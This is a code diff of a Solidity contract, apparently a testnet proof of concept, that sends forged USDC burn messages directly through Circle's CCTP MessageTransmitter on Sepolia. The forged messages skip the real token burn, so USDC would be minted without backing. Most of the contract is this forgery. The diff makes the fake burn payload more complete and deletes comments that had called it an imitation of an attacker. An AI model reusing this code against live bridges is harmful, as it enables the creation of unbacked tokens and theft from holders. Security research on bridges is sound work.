@@ -1,17 +1,18 @@
 // SPDX-License-Identifier: MIT
-pragma solidity .8.0;
+pragma solidity ^0.8.20;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-interface IMessageTransmitter {
+interface IMessageTransmitterV2 {
     function sendMessage(
         uint32 destinationDomain,
         bytes32 recipient,
-        bytes calldata messageBody
+        bytes calldata messageBody,
+        uint32 minFinalityThreshold
     ) external returns (uint64 nonce);
 }
 
-interface ITokenMessenger {
+interface ITokenMessengerV2 {
     function depositForBurn(
         uint256 amount,
         uint32 destinationDomain,
@@ -21,81 +22,93 @@ interface ITokenMessenger {
 }
 
 contract CCTPMessageTest is Ownable {
-    // MessageTransmitterV2 Address (Sepolia)
-    IMessageTransmitter public constant messageTransmitter =
-        IMessageTransmitter(0xE737e5cEBEEBa77EFE34D4aa090756590b1CE275);
+    // Sepolia MessageTransmitterV2
+    IMessageTransmitterV2 public constant messageTransmitter =
+        IMessageTransmitterV2(
+            0xE737e5cEBEEBa77EFE34D4aa090756590b1CE275
+        );
 
-    // TokenMessengerV2 Address (Sepolia)
-    ITokenMessenger public constant tokenMessenger =
-        ITokenMessenger(0x8FE6B999Dc680CcFDD5Bf7EB0974218be2542DAA);
+    // Sepolia TokenMessengerV2
+    ITokenMessengerV2 public constant tokenMessenger =
+        ITokenMessengerV2(
+            0x8FE6B999Dc680CcFDD5Bf7EB0974218be2542DAA
+        );
 
-    // USDC Address (Sepolia USDC)
+    // Sepolia USDC
     address public constant usdc =
         0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238;
 
-    event MessageSent(uint64 nonce, bytes message);
+    uint32 public constant FAST_FINALITY_THRESHOLD = 1000;
+    uint32 public constant FINALIZED_THRESHOLD = 2000;
 
-    constructor() {}
+    event MessageSent(uint64 indexed nonce, bytes message);
 
-    // Function to send a message directly through MessageTransmitter
-    // This bypasses TokenMessenger.depositForBurn() entirely
+    constructor() Ownable(msg.sender) {}
+
     function sendDirectMessage(
         uint32 destinationDomain,
         bytes32 recipientAddress,
-        bytes calldata arbitraryMessage
+        uint256 amount
     ) external onlyOwner returns (uint64 nonce) {
-        // Call MessageTransmitter directly with arbitrary message content
+        bytes memory burnMessage = abi.encode(
+            uint32(1),
+            bytes32(uint256(uint160(usdc))),
+            recipientAddress,
+            amount,
+            bytes32(uint256(uint160(msg.sender))),
+            uint256(0),
+            uint256(0),
+            uint256(0),
+            bytes("")
+        );
+
         nonce = messageTransmitter.sendMessage(
             destinationDomain,
             recipientAddress,
-            arbitraryMessage
+            burnMessage,
+            FINALIZED_THRESHOLD
         );
 
-        emit MessageSent(nonce, arbitraryMessage);
-        return nonce;
+        emit MessageSent(nonce, burnMessage);
     }
 
-    // Function to create a fake USDC deposit message
-    // This mimics what the attacker would have sent
     function sendFakeUSDCDeposit(
         uint32 destinationDomain,
         bytes32 recipientAddress,
         uint256 fakeAmount
     ) external onlyOwner returns (uint64 nonce) {
-        // Create a message body that looks like a USDC deposit
-        // but without actually burning any tokens
-        bytes memory fakeDepositMessage = abi.encode(
-            usdc,                // token address
-            fakeAmount,          // amount (fake)
-            recipientAddress     // mint recipient
+        bytes memory fakeBurnMessage = abi.encode(
+            uint32(1),
+            bytes32(uint256(uint160(usdc))),
+            recipientAddress,
+            fakeAmount,
+            bytes32(uint256(uint160(msg.sender))),
+            uint256(0),
+            uint256(0),
+            uint256(0),
+            bytes("")
         );
 
-        // Send directly through MessageTransmitter
         nonce = messageTransmitter.sendMessage(
             destinationDomain,
             recipientAddress,
-            fakeDepositMessage
+            fakeBurnMessage,
+            FINALIZED_THRESHOLD
         );
 
-        emit MessageSent(nonce, fakeDepositMessage);
-        return nonce;
+        emit MessageSent(nonce, fakeBurnMessage);
     }
 
-    // Function to demonstrate the normal flow through TokenMessenger
     function sendNormalDeposit(
         uint256 amount,
         uint32 destinationDomain,
         bytes32 mintRecipient
     ) external onlyOwner returns (uint64 nonce) {
-        // This requires you to actually have USDC tokens to burn
         nonce = tokenMessenger.depositForBurn(
             amount,
             destinationDomain,
             mintRecipient,
             usdc
         );
-
-        emit MessageSent(nonce, abi.encode(usdc, amount, mintRecipient));
-        return nonce;
     }
 }
